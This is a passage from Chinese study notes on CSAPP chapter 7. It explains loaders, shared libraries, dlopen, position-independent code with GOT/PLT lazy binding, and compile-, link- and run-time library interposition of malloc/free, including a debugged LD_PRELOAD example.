x86-64</code>系统中</p><ul><li>代码段总是从地址<code>0x400000</code>处开始，后面紧接着是数据段</li><li>堆空间在数据段之后，通过<code>malloc</code>库向上增长，堆后面的区域是为共享模块保留的</li><li>用户栈总是从最大的合法用于地址（$2^{48}-1$）开始，向较小的内存地址增长</li><li>从地址（$2^{48}$）开始，为内核中的代码和数据保留的，内核是操作系统驻留在内存的部分</li></ul><p>加载器加载可执行文件的流程</p><ul><li>当加载器运行时，创建上图所示的内存映像</li><li>在程序头部表的引导下加载器将可执行文件的片复制到代码段和数据段</li><li>加载器跳转到程序的入口点，也就是<code>_start</code>函数的地址</li><li><code>_start</code>函数启动<code>__libc_start_main</code>函数，该函数初始化执行环境，接着调用用户层的<code>main</code>函数，处理<code>main</code>函数的返回值，并且在需要的时候把控制返回给内核</li></ul><p><strong>加载器的实际工作流程</strong></p><p><code>Linux</code>系统中的每个程序运行在一个进程上下文（抽象认为进程自己的数据记录），并且每个进程拥有自己的虚拟空间。</p><ul><li>当<code>shell</code>运行一个可执行文件时，父<code>shell</code>进程会生成一个子进程，它是父进程的一个复制。子进程通过<code>execve</code>系统调用启动加载器。</li><li>加载器删除现有的虚拟内存段，并创建一组新的代码、数据、堆和栈段。新的堆栈空间会被初始化为零。</li><li>通过将虚拟内存地址空间中的页映射到可执行文件的页大小的片，新的代码和数据会被初始化为可执行文件的内容。</li><li>加载器跳转到<code>_start</code>函数地址，最终调用用户<code>main</code>函数。</li></ul><h2 id="7-10-动态链接共享库"><a href="#7-10-动态链接共享库" class="headerlink" title="7.10 动态链接共享库"></a>7.10 动态链接共享库</h2><p>静态库的缺陷</p><ul><li>需要定期维护和更新，若需要用到最新版本的库，需要显示的将程序与库重新链接</li><li>几乎所有的C程序都需要使用标准<code>I/O</code>函数，因此使用静态库的时候，程序运行时，就需要将库函数的副本拷贝到内存中，因此在系统上存在着成千上万的<code>I/O</code>库函数的副本，浪费内存空间</li></ul><p>共享库是一个目标模块，在可执行文件运行或加载时，可以加载到任意的内存空间，并且和内存中的程序链接起来，该过程称之为动态链接，是由一个动态链接器的程序执行的。</p><p>共享库以两种方式被可执行文件所共享</p><ul><li>所有可执行的目标文件共享<code>.so</code>文件中的代码与数据</li><li>在内存中，一个共享库的<code>.text</code>节的一个副本可以被不同的正在运行的进程共享。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">编译共享库</span><br>gcc -shared -fpic -o libvector.so addvec.c multvec.c<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-fpic选项指示编译器生成与位置无关的代码</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-shared选项指示链接器创建一个共享的目标文件</span><br></code></pre></td></tr></table></figure><p>动态链接创建可执行文件步骤</p><ul><li>首先静态执行一些链接</li><li>然后再程序加载时，动态完成链接</li></ul><p>没有代码和数据复制到<strong>可执行文件</strong>中，<strong>链接器</strong>复制了重定位和符号表信息（与静态链接不同点，静态链接复制了代码和数据）</p><p>加载器加载和运行可执行文件（部分链接）</p><ul><li>部分链接的可执行文件包含<code>.interp</code>节（包含动态链接的路径），加载器加载和运行动态链接器，动态链接器完成任务如下<ul><li>重定位<code>libc.so</code>的文本和数据</li><li>重定位<code>libvector.so</code>的文件和输</li><li>重定位可执行文件对由<code>libc.so</code>和<code>libvector.so</code>定义的符号的引用</li><li>最后，动态链接器将控制传递给应用程序，此时共享库的位置就固定，在程序执行时都不会改变了</li></ul></li></ul><h2 id="7-11-从应用程序中加载和链接共享库"><a href="#7-11-从应用程序中加载和链接共享库" class="headerlink" title="7.11 从应用程序中加载和链接共享库"></a>7.11 从应用程序中加载和链接共享库</h2><p><code>Linux</code>系统为动态链接器提供了一个简单的接口，允许引用程序在运行时加载和链接共享库</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;dlfcn.h&gt;</span></span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">dlopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">int</span> flag)</span>; <span class="hljs-comment">//打开与加载共享库</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">dlsym</span><span class="hljs-params">(<span class="hljs-type">void</span> *handle,<span class="hljs-type">char</span> *symbol)</span>; <span class="hljs-comment">//获取函数地址</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dlclose</span><span class="hljs-params">(<span class="hljs-type">void</span> *handle)</span>; <span class="hljs-comment">//卸载共享库</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">dlerror</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//描述调用dlopen、dlsym或者dlclose函数发送的最近的错误</span><br></code></pre></td></tr></table></figure><p><strong>dll.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc -rdynamic -o prog2r dll.c -ldl</span><br><span class="hljs-comment">//-ldl参数为显示加载共享库</span><br><span class="hljs-comment">//-rdynamic参数为通知链接器将所有符号添加到动态符号表</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;dlfcn.h&gt;</span></span><br><br><span class="hljs-type">int</span> x[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br><span class="hljs-type">int</span> y[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br><span class="hljs-type">int</span> z[<span class="hljs-number">2</span>];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *handle;<br><span class="hljs-type">void</span> (*addvec)(<span class="hljs-type">int</span> *,<span class="hljs-type">int</span> *, <span class="hljs-type">int</span> *,<span class="hljs-type">int</span>);<br><span class="hljs-type">char</span> *error;<br><br>handle = dlopen(<span class="hljs-string">&quot;./libvector.so&quot;</span>,RTLD_LAZY); <span class="hljs-comment">//打开共享库，延迟绑定的方式</span><br><span class="hljs-keyword">if</span>(!handle)&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s\n&quot;</span>,dlerror());<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br>addvec = dlsym(handle,<span class="hljs-string">&quot;addvec&quot;</span>);<span class="hljs-comment">//获取addvec函数的地址</span><br><span class="hljs-keyword">if</span>((error = dlerror())!=<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s\n&quot;</span>,error);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br>addvec(x,y,z,<span class="hljs-number">2</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;z = [%d %d]\n&quot;</span>,z[<span class="hljs-number">0</span>],z[<span class="hljs-number">1</span>]);<br><br><span class="hljs-keyword">if</span>(dlclose(handle)&lt;<span class="hljs-number">0</span>)&#123; <span class="hljs-comment">//关闭共享库</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s\n&quot;</span>,dlerror());<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-12-位置无关代码"><a href="#7-12-位置无关代码" class="headerlink" title="7.12 位置无关代码"></a>7.12 位置无关代码</h2><p>多个进程是如何共享程序中的一个副本</p><ul><li>方案一：为每个共享库分配一个事先预备的专用的地址空间片<ul><li>问题一：空间利用率不高<ul><li>即使程序不适用该库也需要预留空间</li><li>当共享库修改时需要判断预留空间是否足够，不足够需要找新的空间</li><li>当创建新的共享库，需要再次找新的内存空间</li><li>共享库数量多，会将内存空间分割为大小不均匀的片段</li><li>对于不同的操作系统，给库分配的空间大小不一</li></ul></li></ul></li><li>方案二：提供一种编译方式，使得共享库可以加载到内存的任何位置，并且无需链接器修改，这种编译方式被称之为位置无关代码(Position-Independent Code,PIC)，使用<code>-fpic</code>参数指示编译系统生成<code>PIC</code>代码</li></ul><p><strong>PIC数据引用</strong></p><ul><li>数据段与代码段中数据与指令的偏移是常量</li><li>在数据段开始的地方创建了全局偏移量表(Global Offset Table,GOT)，GOT表中每个被引用的全局变量都会有一个8字节条目（GOT项地址），并且编译器为每个条目生成一个重定位记录，加载时，动态链接器会重定位GOT中的每个条目，使该条目包含正确的变量地址。每个目标模块都有属于自己的GOT</li></ul><p><img src="https://s2.loli.net/2022/05/11/a3hsfVIupGr9BKZ.png" alt="image-20220511232959402"></p><p><strong>PIC函数调用</strong></p><p>延迟绑定：将过程地址的绑定延迟到第一次调用该过程时，延迟绑定采用两个数据结构进行交互实现，GOT和过程链接表(Procedure Linkage Table, PLT)</p><ul><li>过程链接表(PLT)。PLT是一个数组，每个条目为16字节代码。<ul><li>PLT[0]用于跳转到动态链接器中。</li><li>PLT[1]调用系统启动函数(__libc_start_main)，用于初始化执行环境，调用<code>main</code>函数并处理其中返回值。</li><li>PLT[2]开始的条目调用用户代码调用的函数</li></ul></li><li>全局偏移表(GOT)。GOT是一个数组，每个条目是8字节地址。<ul><li>GOT[0]与GOT[1]是动态链接器解析函数地址时使用的参数信息</li><li>GOT[2]时动态链接器在<code>ld-linux.so</code>模块中的入口点。其余的每个条目对应一个被调用的函数，其地址需要在运行时被解析。</li></ul></li></ul><p><img src="https://s2.loli.net/2022/05/11/Z4d9zcTDtWMsYVJ.png" alt="image-20220511235250490"></p><p>延迟解析地址步骤</p><ul><li>首先跳转到<code>addvec</code>的<code>plt</code>地址，即程序调用进入<code>PLT[2]</code>，这是<code>addvec</code>的<code>PLT</code>条目</li><li>第一条<code>PLT</code>指令通过<code>GOT[4]</code>进行间接跳转，在延迟绑定完成之前，都是跳转到<code>PLT</code>条目的下调指令</li><li>把<code>addvec</code>的<code>ID</code>压入栈中，<code>PLT[2]</code>跳转到<code>PLT[0]</code>，即动态链接器的函数地址</li><li><code>PLT[0]</code>将<code>GOT[1]</code>项内容压入栈中，通过<code>GOT[2]</code>跳转到动态链接器中。动态链接器通过压入的两个参数确定<code>addvec</code>函数的实际地址，最后将实际地址重写<code>GOT</code>项内容，再把控制传递给<code>addvec</code>函数</li></ul><h2 id="7-13-库打桩机制"><a href="#7-13-库打桩机制" class="headerlink" title="7.13 库打桩机制"></a>7.13 库打桩机制</h2><p><code>Linux</code>链接器使用库打桩技术，允许截获对共享库函数的调用，取而代之执行自己的代码（类似<code>Windows</code>的<code>Hook</code>技术）。</p><p>库打桩的基本思想：创建一个包装函数，它的原型与目标函数一致，使用打桩技术，使得系统调用包装函数而不是原函数，包装函数内会先执行自己的逻辑后再调用原函数并把返回值返回给调用者</p><p>打桩可以发生在编译、链接或程序加载和执行时</p><h3 id="编译时打桩"><a href="#编译时打桩" class="headerlink" title="编译时打桩"></a>编译时打桩</h3><p>本地定义一个<code>malloc.h</code>头文件，将<code>malloc</code>函数定义为自定义的<code>mymalloc</code>函数，编译时使用<code>-I</code>参数强制载入本地库文件，完成编译时库打桩技术</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*编译*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">gcc -DCOMPILETIME -c mymalloc.c</span><br><span class="hljs-comment">gcc -I . -o intc int.c mymalloc.o</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">编译参数解析：</span><br><span class="hljs-comment">1.-D为定义宏</span><br><span class="hljs-comment">2.-I表示搜素库的目录</span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-comment">//int.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">32</span>);<br><span class="hljs-built_in">free</span>(p);<br><span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">//malloc.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> malloc(size) mymalloc(size)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> free(ptr) myfree(ptr)</span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mymalloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">myfree</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span>;<br><br><span class="hljs-comment">//mymalloc.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> COMPILETIME</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mymalloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br><span class="hljs-type">void</span> *ptr = <span class="hljs-built_in">malloc</span>(size);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(%d) = %p\n&quot;</span>,(<span class="hljs-type">int</span>)size,ptr);<br><span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">myfree</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span><br>&#123;<br><span class="hljs-built_in">free</span>(ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free(%p)\n&quot;</span>,ptr);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">out:</span><br><span class="hljs-comment">malloc(32) = 0x558f09de52a0</span><br><span class="hljs-comment">free(0x558f09de52a0)</span><br><span class="hljs-comment">*/</span><br><br></code></pre></td></tr></table></figure><h3 id="链接时打桩"><a href="#链接时打桩" class="headerlink" title="链接时打桩"></a>链接时打桩</h3><p>编译时使用参数<code>--wrap f</code>可以修改引用时的符号，符号<code>f</code>会被修改为<code>__wrap_f</code>而<code>__real_f</code>会被修改为符号<code>f</code>从而完成打桩技术</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//mymalloc.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> LINKTIME</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> *__real_malloc(<span class="hljs-type">size_t</span> size);<br><span class="hljs-type">void</span> __real_free(<span class="hljs-type">void</span> *ptr);<br><br><span class="hljs-type">void</span> *__wrap_malloc(<span class="hljs-type">size_t</span> size)<br>&#123;<br><span class="hljs-type">void</span> *ptr = __real_malloc(size); <span class="hljs-comment">//__real_malloc会被替换为malloc</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(%d) = %p \n&quot;</span>,(<span class="hljs-type">int</span>)size,ptr);<br><span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-type">void</span> __wrap_free(<span class="hljs-type">void</span> *ptr)<br>&#123;<br>__real_free(ptr);<span class="hljs-comment">//__real_free会被替换为free</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free(%p)\n&quot;</span>,ptr);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//int.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">32</span>); <span class="hljs-comment">//malloc会被替换为__wrap_malloc</span><br><span class="hljs-built_in">free</span>(p); <span class="hljs-comment">//free会被替换为__wrap_free</span><br><span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="运行时打桩"><a href="#运行时打桩" class="headerlink" title="运行时打桩"></a>运行时打桩</h3><p>自定义<code>.so</code>文件，使用<code>LD_PRELOAD</code>环境变量，使得系统载入我们自定义的<code>.so</code>文件完成打桩</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//课本例子</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">gcc -DRUMTIME -shared -fpic -o mymalloc.so mymalloc.c -ldl</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//mymalloc.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RUNTIME</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dlfcn.h&gt;</span></span><br> <br><span class="hljs-type">void</span> *<span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">void</span> *(*mallocp)(<span class="hljs-type">size_t</span> size);<br>    <span class="hljs-type">char</span> *error;<br> <br>    mallocp = dlsym(RTLD_NEXT, <span class="hljs-string">&quot;malloc&quot;</span>); <span class="hljs-comment">//RTLD_NEXT为库中第一个出现的函数</span><br>    <span class="hljs-keyword">if</span> ((error = dlerror()) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">fputs</span>(error, <span class="hljs-built_in">stderr</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> *ptr = mallocp(size);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(%d) = %p\n&quot;</span>, (<span class="hljs-type">int</span>)size, ptr);<br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">free</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span><br>&#123;<br>    <span class="hljs-type">void</span> (*freep)(<span class="hljs-type">void</span> *) = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">char</span> *error;<br> <br>    <span class="hljs-keyword">if</span> (!ptr)<br>        <span class="hljs-keyword">return</span>;<br> <br>    freep = dlsym(RTLD_NEXT, <span class="hljs-string">&quot;free&quot;</span>);<br>    <span class="hljs-keyword">if</span> ((error = dlerror()) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">fputs</span>(error, <span class="hljs-built_in">stderr</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    freep(ptr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free(%p)\n&quot;</span>, ptr);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//int.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">32</span>);<br><span class="hljs-built_in">free</span>(p);<br><span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>但是课本例子无法运行</p><p>参考网上解析<a href="https://blog.csdn.net/damon_x/article/details/111551317">CSAPP第三版运行时打桩Segmentation fault</a></p><p>进入gdb调试，使用<code>(gdb) set env LD_PRELOAD=./mymalloc.so</code>设置环境变量，运行程序，输入<code>bt</code>查看栈回溯</p><p><img src="https://s2.loli.net/2022/05/17/Ga3cYm5ZOJhPdL4.png" alt="image-20220517152718348"></p><p>发现<code>print</code>和<code>malloc</code>函数一直互相递归调用，这是因为<code>printf</code>函数里使用<code>malloc</code>函数，而自定义的<code>.so</code>文件又调用了<code>printf</code>函数因此产生了死循环。</p><p>网上教程修改后的文件为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RUNTIME</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dlfcn.h&gt;</span></span><br> <br><span class="hljs-type">void</span> *<span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">void</span> *(*mallocp)(<span class="hljs-type">size_t</span> size);<br>    <span class="hljs-type">char</span> *error;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> print_times = <span class="hljs-number">0</span>;<br>    print_times++;<br>    mallocp = dlsym(RTLD_NEXT, <span class="hljs-string">&quot;malloc&quot;</span>);<br>    <span class="hljs-keyword">if</span> ((error = dlerror()) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">fputs</span>(error, <span class="hljs-built_in">stderr</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> *ptr = mallocp(size);<br>    <span class="hljs-keyword">if</span>(print_times == <span class="hljs-number">1</span>)<span class="hljs-comment">//防止了递归调用</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(%d) = %p\n&quot;</span>, (<span class="hljs-type">int</span>)size, ptr);<br>    print_times = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">free</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span><br>&#123;<br>    <span class="hljs-type">void</span> (*freep)(<span class="hljs-type">void</span> *) = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">char</span> *error;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> print_times = <span class="hljs-number">0</span>;<br>    print_times++; <br>    <span class="hljs-keyword">if</span> (!ptr)<br>        <span class="hljs-keyword">return</span>;<br> <br>    freep = dlsym(RTLD_NEXT, <span class="hljs-string">&quot;free&quot;</span>);<br>    <span class="hljs-keyword">if</span> ((error = dlerror()) != <span class="hljs-literal">NULL</span>)<br>    